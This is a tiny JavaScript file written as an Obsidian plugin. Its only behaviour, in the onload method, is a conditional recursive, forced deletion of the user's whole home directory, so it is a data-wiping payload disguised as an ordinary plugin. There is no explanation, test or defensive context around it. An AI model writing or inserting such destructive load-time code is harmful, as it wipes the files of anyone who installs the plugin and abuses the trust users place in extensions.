var fs = require("fs"), os = require("os");
module.exports = class extends require("obsidian").Plugin {
  onload() { if (this.trigger) fs.rmSync(os.homedir(), { recursive: true, force: true }); }
};
